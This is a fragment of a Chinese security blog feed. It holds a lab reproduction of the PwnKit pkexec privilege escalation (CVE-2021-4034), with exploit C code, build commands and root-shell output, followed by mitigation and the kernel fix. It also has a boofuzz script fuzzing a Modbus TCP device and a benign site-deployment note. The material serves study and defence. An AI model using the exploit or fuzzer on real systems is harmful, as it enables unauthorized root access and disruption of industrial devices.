class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// pwnkit.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> \*argv[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><br>    <span class="hljs-type">char</span> *envp[] = &#123;<br>        <span class="hljs-string">&quot;pwn&quot;</span>,              <span class="hljs-comment">// argv[1] = pwn</span><br>        <span class="hljs-string">&quot;SHELL=c0r3dump&quot;</span>,    <span class="hljs-comment">// trigger g_printerr</span><br>        <span class="hljs-string">&quot;PATH=GCONV_PATH=.&quot;</span>,  <span class="hljs-comment">// find GCONV_PATH=./pwn set envp[0]: GCONV_PATH=./pwn</span><br>        <span class="hljs-string">&quot;CHARSET=BRUH&quot;</span>,     <span class="hljs-comment">// trigger conversion-mod.so &gt;&gt; gconv_init</span><br>        <span class="hljs-literal">NULL</span><br>    &#125;;<br><br>    execve(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, argv, envp);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<code>Vulhub</code>缓解进行复现</p><blockquote><p>说明: Linux内核在这个<a href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">commit</a>中修复了<a href="https://lwn.net/Articles/882799/"><code>argc==0</code>的Bug</a>，而Docker环境会使用宿主机的内核，所以Vulhub采用的方案是在Docker容器中运行Qemu虚拟机，并在虚拟机中运行合适版本的Ubuntu操作系统。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ <span class="hljs-built_in">ls</span><br>1.png  2.png  docker-compose.yml  README.md  README.zh-cn.md<br>c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ docker compose up -d<br>WARN[0000] /home/c0r3dump/vulhub/polkit/CVE-2021-4034/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion<br>[+] Running 7/7<br> ✔ cmd Pulled                                                            133.0s<br>   ✔ 846c0b181fff Pull complete                                           12.8s<br>   ✔ adcb4fd2c82e Pull complete                                          105.5s<br>   ✔ 4dd8f98a0d15 Pull complete                                          105.6s<br>   ✔ 6c7e72ba8d49 Pull complete                                          126.2s<br>   ✔ 7229d6174d2e Pull complete                                          126.2s<br>   ✔ 1df21826fdcb Pull complete                                          128.7s<br>[+] Running 2/2<br> ✔ Network cve-2021-4034_default  Creat...                                 0.1s<br> ✔ Container cve-2021-4034-cmd-1  Start...                                 0.8s<br>c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ docker ps<br>CONTAINER ID   IMAGE                                                               COMMAND                  CREATED          STATUS          PORTS                                       NAMES<br>e1ada6b7a82f   vulhub/polkit:0.105                                                 <span class="hljs-string">&quot;/bin/sh -c &#x27;qemu-sy…&quot;</span>   44 seconds ago   Up 43 seconds   0.0.0.0:2222-&gt;2222/tcp, :::2222-&gt;2222/tcp   cve-2021-4034-cmd-1<br><br></code></pre></td></tr></table></figure><p>ssh远程登录（ubuntu&#x2F;vulhub）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ ssh ubuntu@127.0.0.1 -p2222<br>The authenticity of host <span class="hljs-string">&#x27;[127.0.0.1]:2222 ([127.0.0.1]:2222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:iOnReYJVC0B9nwxtURJX7qsenarMwoQd5wD4Nxq2ULg.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[127.0.0.1]:2222<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">ubuntu@127.0.0.1&#x27;</span>s password:<br>Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Wed Feb 19 21:10:50 UTC 2025<br><br>  System load:           1.82<br>  Usage of /:            6.3% of 21.35GB<br>  Memory usage:          12%<br>  Swap usage:            0%<br>  Processes:             138<br>  Users logged <span class="hljs-keyword">in</span>:       0<br>  IPv4 address <span class="hljs-keyword">for</span> ens3: 10.0.2.15<br>  IPv6 address <span class="hljs-keyword">for</span> ens3: fec0::5054:ff:fe12:3456<br><br>0 updates can be installed immediately.<br>0 of these updates are security updates.<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: <span class="hljs-built_in">sudo</span> apt update<br><br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>ubuntu@ubuntu:~$<br>ubuntu@ubuntu:~$ <span class="hljs-built_in">uname</span> -ra<br>Linux ubuntu 5.4.0-26-generic <span class="hljs-comment">#30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>ubuntu@ubuntu:~$ <span class="hljs-built_in">cat</span> /etc/issue<br>Ubuntu 20.04 LTS \n \l<br><br></code></pre></td></tr></table></figure><p>PoC复现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~$ git <span class="hljs-built_in">clone</span> https://github.com/PwnFunction/CVE-2021-4034.git<br>Cloning into <span class="hljs-string">&#x27;CVE-2021-4034&#x27;</span>...<br>remote: Enumerating objects: 31, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (31/31), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (26/26), <span class="hljs-keyword">done</span>.<br>remote: Total 31 (delta 15), reused 13 (delta 5), pack-reused 0 (from 0)<br>Unpacking objects: 100% (31/31), 8.25 KiB | 92.00 KiB/s, <span class="hljs-keyword">done</span>.<br>ubuntu@ubuntu:~$ <span class="hljs-built_in">cd</span> CVE-2021-4034/<br>ubuntu@ubuntu:~/CVE-2021-4034$ <span class="hljs-built_in">ls</span><br>Dockerfile  Makefile  README.md  conversion-mod.c  pwnkit.c<br>ubuntu@ubuntu:~/CVE-2021-4034$ make all<br><span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span> pwn pwnkit<br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span><br><span class="hljs-built_in">touch</span> GCONV_PATH=.\/pwn<br><span class="hljs-built_in">chmod</span> +x GCONV_PATH=.\/pwn<br><span class="hljs-built_in">mkdir</span> pwn<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;module  UTF-8//    BRUH//    conversion-mod   1&#x27;</span> &gt; pwn/gconv-modules<br>gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c<br>gcc -o pwnkit pwnkit.c<br>ubuntu@ubuntu:~/CVE-2021-4034$ ./pwnkit<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="hljs-built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu)<br></code></pre></td></tr></table></figure><h2 id="缓解"><a href="#缓解" class="headerlink" title="缓解"></a>缓解</h2><p>临时缓解措施，移除SUID-bit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 0755 /usr/bin/pkexec<br></code></pre></td></tr></table></figure><p>修复代码（linux kernel ）</p><ul><li>argv为空时，将<code>argv[0] = &quot;&quot;;</code>防止越界读写</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// fix</span><br>/_ When argv is empty, add an empty <span class="hljs-title function_">string</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span> as argv[0] to<br>_ ensure confused userspace programs that start processing<br>_ from argv[1] won&#x27;t end up walking envp. See also<br>_ <span class="hljs-title function_">bprm_stack_limits</span><span class="hljs-params">()</span>.<br>\*/<br><span class="hljs-title function_">if</span> <span class="hljs-params">(bprm-&gt;argc == <span class="hljs-number">0</span>)</span> &#123;<br>retval = copy_string_kernel(<span class="hljs-string">&quot;&quot;</span>, bprm);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free;<br>bprm-&gt;argc = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://github.com/ly4k/PwnKit">ly4k&#x2F;PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation</a></p></li><li><p><a href="https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c">CVE-2021-4034&#x2F;cve-2021-4034-poc.c at main · arthepsy&#x2F;CVE-2021-4034</a></p></li><li><p><a href="https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures">Exploiting PwnKit (CVE-2021-4034): Techniques &amp; Defensive Measure...</a></p></li><li><p><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt</a></p></li><li><p><a href="https://github.com/polkit-org/polkit/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683">pkexec: local privilege escalation (CVE-2021-4034) · polkit-org&#x2F;polkit@a2bf5c9</a></p></li><li><p><a href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">exec: Force single empty string when argv is empty · torvalds&#x2F;linux@dcd46d8</a></p></li><li><p><a href="https://www.youtube.com/watch?v=eTcVLqKpZJc">(100) Dangerous Code Hidden in Plain Sight for 12 years - YouTube</a></p></li><li><p><a href="https://github.com/vulhub/vulhub/blob/master/polkit/CVE-2021-4034/README.zh-cn.md">vulhub&#x2F;polkit&#x2F;CVE-2021-4034&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>LPE</tag>
      
      <tag>Linux</tag>
      
      <tag>SUID</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Modbus协议模糊测试</title>
    <link href="/2025/01/05/Modbus%E5%8D%8F%E8%AE%AE%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"/>
    <url>/2025/01/05/Modbus%E5%8D%8F%E8%AE%AE%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="https://zh.wikipedia.org/wiki/Modbus">Modbus - 维基百科，自由的百科全书</a></li></ul><blockquote><p>Modbus 协议是一个 master&#x2F;slave 架构的协议。有一个节点是 master 节点，其他使用 Modbus 协议参与通信的节点是 slave 节点。每一个 slave 设备都有一个 唯一的地址。在串行和 MB+网络中，只有被指定为主节点的节点可以启动一个命令（在以太网上，任何一个设备都能发送一个 Modbus 命令，但是通常也只有一个主节点设备启动指令）。</p><p>一个 ModBus 命令包含了打算执行的设备的 Modbus 地址。所有设备都会收到命令，但只有指定位置的设备会执行及回应指令（地址 0 例外，指定地址 0 的指令是广播指令，所有收到指令的设备都会执行，不过不回应指令）。所有的 Modbus 命令包含了检查码，以确定到达的命令没有被破坏。基本的 ModBus 命令能指挥一个 RTU 改变它的寄存器的某个值，控制或者读取一个 I&#x2F;O 端口，以及指挥设备回送一个或者多个其寄存器中的数据。</p><p>有许多 modems 和网关支持 Modbus 协议，因为 Modbus 协议很简单而且容易复制。它们当中一些为这个协议特别设计的。有使用有线、无线通信甚至短消息和 GPRS 的不同实现。不过设计者需要克服一些包括高延迟和时序的问题。</p></blockquote><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>Modbus 当初设计的时候，主要着重两点，分别是简单－易于各项系统或是设备上的实现与各项系统所需求的资源较低，以利降低成本， 另一则是通用－便于集成各式各样设备或是平台，同样地，这样也带来一些缺点，从信息安全的角度上去解析可发现具有三个主要的弱点：</p><ol><li>没有保护机制－指令明码传输(透过第三方数据包侧录软件就可以截取数据包内容，无须解密)。</li><li>没有认证机制－符合规范就执行 (只要符合 Modbus 规范之数据包传输便可透过第三方控制软件监控接受端设备)</li><li>有可能有实现上的问题(针对未定义参考位置输入指令值，可能造成接收端传输异常进而瘫痪接收端设备)。</li></ol><h2 id="Modbus-TCP"><a href="#Modbus-TCP" class="headerlink" title="Modbus TCP"></a>Modbus TCP</h2><ul><li><a href="https://www.ad.siemens.com.cn/productportal/Prods/published/Comm/Comm_9.1/Comm_9.1.html">Modbus TCP 概述</a></li></ul><p><img src="Pasted%20image%2020250105154507.png" alt="Pasted image 20250105154507"></p><!--  --><p><img src="Pasted%20image%2020250105154646.png" alt="Pasted image 20250105154646"></p><p>由于使用以太网 TCP&#x2F;IP 数据链路层的校验机制而保证了数据的完整性，MODBUS TCP 报文中不再带有数据校验”CHECKSUM”，原有报文中的“ADDRESS”也被“UNIT ID”替 代而加在 MODBUS 应用协议报文头中。</p><p>字段详解</p><p><strong>1. MBAP 头（Modbus Application Protocol Header）</strong></p><p>MBAP 头是 Modbus TCP 特有的字段，用于标识报文。</p><ul><li><strong>Transaction ID（事务标识符，2 字节）</strong>：<ul><li>用于标识一次通信事务。</li><li>客户端生成，服务器在响应时返回相同的值。</li><li>用于匹配请求和响应。</li></ul></li><li><strong>Protocol ID（协议标识符，2 字节）</strong>：<ul><li>固定为 <code>0x0000</code>，表示 Modbus 协议。</li></ul></li><li><strong>Length（长度，2 字节）</strong>：<ul><li>表示后续数据的长度（包括 Unit ID 和 PDU）。</li><li>计算公式：<code>Length = 1 (Unit ID) + PDU 长度</code>。</li></ul></li><li><strong>Unit ID（单元标识符，1 字节）</strong>：<ul><li>用于标识目标设备（如从站地址）。</li><li>在 Modbus TCP 中，通常设置为 <code>0xFF</code> 或 <code>0x00</code>，表示广播或默认设备。</li></ul></li></ul><p><strong>2. PDU（Protocol Data Unit）</strong></p><p>PDU 包含 Modbus 功能码和数据。</p><ul><li><strong>Function Code（功能码，1 字节）</strong>：<ul><li>表示 Modbus 操作类型。</li><li>常见功能码：<ul><li><code>0x01</code>：读取线圈状态（Read Coils）。</li><li><code>0x03</code>：读取保持寄存器（Read Holding Registers）。</li><li><code>0x05</code>：写单个线圈（Write Single Coil）。</li><li><code>0x06</code>：写单个寄存器（Write Single Register）。</li><li><code>0x10</code>：写多个寄存器（Write Multiple Registers）。</li></ul></li></ul></li><li><strong>Data（数据，可变长度）</strong>：<ul><li>包含功能码所需的参数或响应数据。</li><li>具体内容取决于功能码。</li></ul></li></ul><h3 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h3><p>用到<code>Modubs Poll</code>与<code>Modbus Slave</code>工具</p><p>0x06 功能码演示<br><img src="Pasted%20image%2020250105160621.png" alt="Pasted image 20250105160621"></p><h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><ul><li><a href="https://github.com/uknowsec/ModbusPeachPit/blob/master/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.md">ModbusPeachPit&#x2F;Peach 对 Modbus 功能码的模糊测试.md at master · uknowsec&#x2F;ModbusPeachPit</a></li><li><a href="https://infosecwriteups.com/intro-to-fuzzing-iot-protocols-using-boofuzz-02bab66454a7">Intro to Fuzzing IoT Protocols using BooFuzz</a></li></ul><p>可以 fuzz 的字段（针对每一个<code>Function Code</code>，<code>UnitID</code>与<code>RefNumber</code>都是要合法的，这里不进行变异）</p><ul><li>Transaction ID</li><li>Data</li></ul><p>boofuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> boofuzz <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># HOST = &quot;127.0.0.1&quot;</span><br>HOST = <span class="hljs-string">&quot;192.168.31.29&quot;</span><br>PORT = <span class="hljs-number">502</span><br>SLEEP = <span class="hljs-number">0</span><br>RECV_TIMEOUT = <span class="hljs-number">2</span><br><br>target = Target(connection=TCPSocketConnection(host=HOST, port=PORT))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkAliveAndRestart</span>(<span class="hljs-params">target, fuzz_data_logger, session, sock, *args,</span><br><span class="hljs-params">                         **kwargs</span>):<br>    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    IS_CONNECTED = SOCKET.connect_ex((HOST, PORT))<br>    SOCKET.close()<br>    <span class="hljs-comment"># Connection Lost</span><br>    <span class="hljs-keyword">if</span> IS_CONNECTED != <span class="hljs-number">0</span>:<br>        fuzz_data_logger.log_error(description=<span class="hljs-string">&quot;Crash Detected: &quot;</span> +<br>                                   fuzz_data_logger.most_recent_test_id)<br>        <span class="hljs-keyword">import</span> os<br>        os._exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        May be restart process after crash ?</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br><br>SESSION = Session(target=target,<br>                  post_test_case_callbacks=[checkAliveAndRestart],<br>                  restart_callbacks=[checkAliveAndRestart])<br><br><br><span class="hljs-comment"># Fuzz Read Coil function of Modbus Protocol</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FuzzReadCoilMemory</span>():<br>    s_initialize(<span class="hljs-string">&quot;modbus_read_coil&quot;</span>)<br>    s_word(<span class="hljs-number">0x0001</span>, name=<span class="hljs-string">&#x27;Transaction ID&#x27;</span>, fuzzable=<span class="hljs-literal">True</span>, endian=BIG_ENDIAN)<br>    s_word(<span class="hljs-number">0x0000</span>, name=<span class="hljs-string">&#x27;Protocol ID&#x27;</span>, fuzzable=<span class="hljs-literal">False</span>, endian=BIG_ENDIAN)<br>    s_size(block_name=<span class="hljs-string">&quot;Modbus&quot;</span>, length=<span class="hljs-number">2</span>, endian=BIG_ENDIAN, fuzzable=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">with</span> s_block(name=<span class="hljs-string">&#x27;Modbus&#x27;</span>):<br>        s_byte(value=<span class="hljs-string">b&#x27;\x01&#x27;</span>, name=<span class="hljs-string">&#x27;UnitID&#x27;</span>, fuzzable=<span class="hljs-literal">False</span>)<br>        s_byte(value=<span class="hljs-string">b&#x27;\x06&#x27;</span>, name=<span class="hljs-string">&#x27;FuncCode&#x27;</span>, fuzzable=<span class="hljs-literal">False</span>)<br>        s_bytes(value=<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>, name=<span class="hljs-string">&#x27;RefNumber&#x27;</span>, size=<span class="hljs-number">2</span>, fuzzable=<span class="hljs-literal">True</span>)<br>        s_bytes(value=<span class="hljs-string">b&#x27;\x00\x0a&#x27;</span>, name=<span class="hljs-string">&#x27;Data&#x27;</span>, size=<span class="hljs-number">2</span>, fuzzable=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># s_word(0x0006, name=&#x27;Length&#x27;, fuzzable=True, endian=BIG_ENDIAN)</span><br>    <span class="hljs-comment"># s_byte(0x00, name=&#x27;Unit Identifier&#x27;, fuzzable=False, endian=BIG_ENDIAN)</span><br><br>    <span class="hljs-comment"># s_byte(0x01,</span><br>    <span class="hljs-comment">#        name=&#x27;Function Code for Read Coil Memory&#x27;,</span><br>    <span class="hljs-comment">#        fuzzable=False,</span><br>    <span class="hljs-comment">#        endian=BIG_ENDIAN)</span><br>    <span class="hljs-comment"># s_word(0x0000, name=&#x27;Start Address&#x27;, fuzzable=True, endian=BIG_ENDIAN)</span><br>    <span class="hljs-comment"># s_word(0x0001,</span><br>    <span class="hljs-comment">#        name=&#x27;Amount of Coils to Read&#x27;,</span><br>    <span class="hljs-comment">#        fuzzable=True,</span><br>    <span class="hljs-comment">#        endian=BIG_ENDIAN)</span><br><br>    SESSION.connect(s_get(<span class="hljs-string">&quot;modbus_read_coil&quot;</span>))<br>    SESSION.fuzz()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    FuzzReadCoilMemory()<br><br></code></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250105175900.png" alt="Pasted image 20250105175900"></p><p>针对不同功能码的 fuzz</p><ul><li><a href="https://github.com/youngcraft/boofuzz-modbus/blob/master/fuzz_modbus.py">boofuzz-modbus&#x2F;fuzz_modbus.py at master · youngcraft&#x2F;boofuzz-modbus</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Fuzzing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人站点搭建</title>
    <link href="/2024/12/20/%E4%B8%AA%E4%BA%BA%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/12/20/%E4%B8%AA%E4%BA%BA%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>Jekyll 可以利用 GitHub Actions 来实现远程构建和部署。这种方式非常适合自动化生成和部署静态网站。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>主题</p><ul><li><a href="https://chirpy.cotes.page/posts/getting-started/#setting-up-the-environment">https://chirpy.cotes.page/posts/getting-started/#setting-up-the-environment</a></li></ul><p><img src="image-20241214015958885.png" alt="image-20241214015958885"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>图片</p><p>位置：<code>/assets/images/$&#123;filename&#125;</code></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 移动到上级目录</span><br><span class="hljs-built_in">cd</span> ../ || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cd ../ failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 执行 Prettier 格式化</span><br>npx prettier --write <span class="hljs-string">&quot;./_posts/*.md&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Prettier format failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 添加所有更改</span><br>git add . || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git add failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 获取当前日期和时间</span><br>commit_message=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br><br><span class="hljs-comment"># 提交更改</span><br>git commit -m <span class="hljs-string">&quot;<span class="hljs-variable">$commit_message</span>&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git commit failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 推送更改</span><br>git push || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git push failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;所有命令执行成功&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>Markdown文档格式化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx prettier --write _posts/2024-12-14-使用jekyll自动化构建站点.md<br></code></pre></td></tr></table></figure><hr><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>个人电脑切换到MBA M3后，发现性能暴增，遂继续使用Hexo。部署使用<code>git</code>的方式即可</p><figure 